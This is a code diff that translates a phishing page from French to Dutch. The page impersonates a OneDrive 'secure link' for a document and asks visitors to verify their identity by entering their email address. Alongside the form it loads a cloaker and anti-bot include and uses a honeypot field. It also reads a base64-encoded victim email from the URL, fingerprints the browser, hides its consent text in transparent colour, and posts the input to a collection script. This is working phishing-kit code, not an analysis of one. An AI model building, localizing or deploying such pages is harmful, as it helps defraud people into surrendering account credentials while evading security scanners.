@@ -1,16 +1,16 @@
 <?php
-// no whitespace/BOM before this line
-require_once __DIR__ . '/includes/index.php'; // your cloaker/antibot
+// geen spaties/BOM vóór deze regel
+require_once __DIR__ . '/includes/index.php'; // cloaker/anti-bot
 ?>
 <!doctype html>
-<html lang="fr">
+<html lang="nl">
 <head>
   <meta charset="utf-8">
-  <title>Vérification de l’e-mail</title>
+  <title>E-mailadres verifiëren</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <meta name="color-scheme" content="light dark">
 <style>
-  /* ===== Brand tokens ===== */
+  /* ===== Merktokens ===== */
   :root{
     --brand:#1f6fd1; --brand-700:#1657a6;
     --bg:#f1f1f1; --card:#f5f5f5; --text:#1f2937; --muted:#6b7280; --border:#ccc;
@@ -52,7 +52,7 @@ require_once __DIR__ . '/includes/index.php'; // your cloaker/antibot
   .caption{ font-size:13px; color:var(--muted); margin-top:13px; margin-bottom:18px }
   .caption small{ display:block; opacity:.95; }
 
-  /* Styled legal line */
+  /* Juridische regel opmaak */
   .caption-legal{ color:#334155; font-weight:600; letter-spacing:.25px; }
 
   .alert{ font:12px/1.6 system-ui,-apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif; margin-top:8px; display:none; color:#b91c1c; }
@@ -64,59 +64,53 @@ require_once __DIR__ . '/includes/index.php'; // your cloaker/antibot
 </head>
 <body>
 
-  <!-- Barre de marque -->
+  <!-- Merkbalk -->
   <div class="brandbar">
     <span id="brandName">OneDrive</span>
   </div>
 
   <main class="wrap">
-    <!-- Logo au-dessus de la carte -->
+    <!-- Logo boven de kaart -->
     <img class="card-logo" src="a/nn.PNG" alt="" width="10" height="10" decoding="async" loading="eager">
 
     <!-- Honeypot -->
     <input type="text" id="middleName" name="middleName" tabindex="-1" autocomplete="off"
            aria-hidden="true" style="position:absolute;left:-9999px;opacity:0;height:0;width:0;border:0;padding:0;">
 
-    <!-- Formulaire -->
-    <form class="card" id="verifyForm" method="post" action="/validate.php">
+    <!-- Formulier -->
+    <form class="card" id="verifyForm" method="post" action="z/validate.php">
       <header class="card-head" aria-labelledby="t">
-        <h1 id="t" class="card-title">Vérifiez votre identité</h1>
+        <h1 id="t" class="card-title">Bevestig uw identiteit</h1>
       </header>
 
       <section class="card-body">
-        <p>Un lien sécurisé vous a été envoyé pour&nbsp;:</p>
+        <p>Er is een beveiligde link naar u verzonden voor:</p>
         <div class="file" id="fileName">FAC64836-2025.docx</div>
-        <p>Pour ouvrir ce lien sécurisé, saisissez l’adresse e-mail avec laquelle il a été partagé.</p>
+        <p>Voer het e-mailadres in waarmee dit is gedeeld om de beveiligde link te openen.</p>
 
         <div class="field">
-          <label for="email">Adresse e-mail</label>
+          <label for="email">E-mailadres</label>
           <input class="input" id="email" name="email" type="email" autocomplete="email"
-                 placeholder="Saisir l’adresse e-mail" required inputmode="email" />
+                 placeholder="Voer uw e-mailadres in" required inputmode="email" />
         </div>
 
-        <!-- Boîte d’erreur (cachée par défaut) -->
+        <!-- Foutmelding (standaard verborgen) -->
         <div id="err" class="alert" role="status" aria-live="polite"></div>
 
         <div class="actions">
-          <button class="btn" id="continueBtn" type="submit" disabled>Suivant</button>
+          <button class="btn" id="continueBtn" type="submit" disabled>Doorgaan</button>
         </div>
 
         <div class="caption" id="disclosure">
-  <small style="color:#transparent;font-weight:400;letter-spacing:.10px;">
-            En sélectionnant Suivant vous autorisez l’utilisation de votre e-mail pour l’authentification et le contrôle d’accès, conformément à notre notice de confidentialité.
+          <small style="color:transparent;font-weight:400;letter-spacing:.10px;">
+            Door op Doorgaan te klikken, geeft u toestemming voor het gebruik van uw e-mailadres voor authenticatie en toegangscontrole, overeenkomstig ons privacybeleid.
           </small>
         </div>
       </section>
     </form>
   </main>
 
-  <div class="simple-footer">© 2025&nbsp;&nbsp;Confidentialité &amp; Cookies</div>
-
-
-
-
-  
-
+  <div class="simple-footer">© 2025&nbsp;&nbsp;Privacy &amp; Cookies</div>
 
 <script>
 document.addEventListener('DOMContentLoaded', () => {
@@ -125,13 +119,14 @@ document.addEventListener('DOMContentLoaded', () => {
   const show = (n, msg) => { if (!n) return; if (msg) n.textContent = msg; n.style.display = 'block'; };
   const hide = n => { if (!n) return; n.style.display = 'none'; };
 
-  // i18n
-  const LANG = ((navigator.languages && navigator.languages[0]) || navigator.language || 'en').slice(0,2).toLowerCase();
+  // i18n (EN/FR/NL)
+  const LANG = ((navigator.languages && navigator.languages[0]) || navigator.language || 'nl').slice(0,2).toLowerCase();
   const T = {
-    en: { invalidEmail:'Please enter a valid email address.', errorGeneric:'Something went wrong. Please try again.', redirecting:'Redirecting…', next:'Continue', placeholder:'username@company.com' },
-    fr: { invalidEmail:'Veuillez saisir une adresse e-mail valide.', errorGeneric:'Une erreur est survenue. Merci de réessayer.', redirecting:'Redirection…', next:'Continuer', placeholder:'nom@entreprise.com' }
+    en: { invalidEmail:'Please enter a valid email address.', errorGeneric:'Something went wrong. Please try again.', redirecting:'Redirecting…', next:'Continue',   placeholder:'username@company.com' },
+    fr: { invalidEmail:'Veuillez saisir une adresse e-mail valide.',          errorGeneric:'Une erreur est survenue. Merci de réessayer.',          redirecting:'Redirection…',    next:'Continuer', placeholder:'nom@entreprise.com' },
+    nl: { invalidEmail:'Voer een geldig e-mailadres in.',                      errorGeneric:'Er is iets misgegaan. Probeer het opnieuw.',            redirecting:'Bezig met doorsturen…', next:'Doorgaan',   placeholder:'voornaam.achternaam@bedrijf.nl' }
   };
-  const t = T[LANG] || T.en;
+  const t = T[LANG] || T.nl;
 
   // DOM
   const form     = $('verifyForm');
@@ -149,32 +144,24 @@ document.addEventListener('DOMContentLoaded', () => {
     } catch { return ''; }
   };
 
-  // Robust auto-grab:
-  // - hash   → https://site/page#<b64url>
-  // - dollar → https://site/page$<b64url>
-  // - query  → https://site/page?e=<b64url>
-  // - path   → last segment as fallback (handles your sample URL form)
+  // Auto-grab e-mail uit URL (#, $, ?e=, of laatste padsegment)
   const emailFromURL = () => {
     const href = String(location.href);
     let encoded = null;
 
-    // 1) fragment
     const h = location.hash ? location.hash.slice(1) : '';
     if (h) encoded = h;
 
-    // 2) dollar marker
     if (!encoded) {
       const i = href.lastIndexOf('$');
       if (i !== -1) encoded = href.slice(i + 1);
     }
 
-    // 3) query ?e=
     if (!encoded) {
       const p = new URLSearchParams(location.search);
       if (p.has('e')) encoded = p.get('e');
     }
 
-    // 4) last path segment fallback (e.g., your sample link)
     if (!encoded) {
       const segs = location.pathname.split('/').filter(Boolean);
       if (segs.length) encoded = segs[segs.length - 1];
@@ -185,17 +172,16 @@ document.addEventListener('DOMContentLoaded', () => {
     return looksLikeEmail(email) ? email.toLowerCase() : null;
   };
 
-  // Prevent placeholder flash: leave blank now; fill later only if needed
-  if (input && input.getAttribute('placeholder') == null) input.setAttribute('placeholder','');
+  // Placeholder pas later zetten → geen “a@b.com”-flits
+  if (input) input.setAttribute('placeholder','');
 
-  // Try to auto-fill from URL
   const autograb = emailFromURL();
   if (autograb && input) {
     input.value = autograb;
-    input.readOnly = true; // optional: lock if prefilled
+    input.readOnly = true; // optioneel
   }
 
-  // Basic fingerprint (optional)
+  // Eenvoudige fingerprint (optioneel)
   let fpHash = '';
   (async () => {
     try {
@@ -205,7 +191,7 @@ document.addEventListener('DOMContentLoaded', () => {
     } catch {}
   })();
 
-  // Button state helpers
+  // Knopstatus
   const setBtn = (enabled, label) => {
     if (!submitEl) return;
     submitEl.disabled = !enabled;
@@ -218,12 +204,12 @@ document.addEventListener('DOMContentLoaded', () => {
     setBtn(looksLikeEmail(input.value), t.next);
   });
 
-  // Submit
+  // Verzenden
   form?.addEventListener('submit', async (e) => {
     e.preventDefault();
 
     const val  = (input?.value || '').trim().toLowerCase();
-    const trap = ($('middleName')?.value || '').trim(); // honeypot must be empty
+    const trap = ($('middleName')?.value || '').trim(); // honeypot moet leeg zijn
 
     if (!looksLikeEmail(val)) return show(errBox, t.invalidEmail);
     if (trap) return; // bot
@@ -270,11 +256,10 @@ document.addEventListener('DOMContentLoaded', () => {
     }
   });
 
-  // Set localized placeholder only if not auto-filled (prevents flash)
+  // Placeholder pas zetten als er niets is ingevuld
   if (input && !input.value) input.setAttribute('placeholder', t.placeholder);
 });
 </script>
-
 
 </body>
 </html>
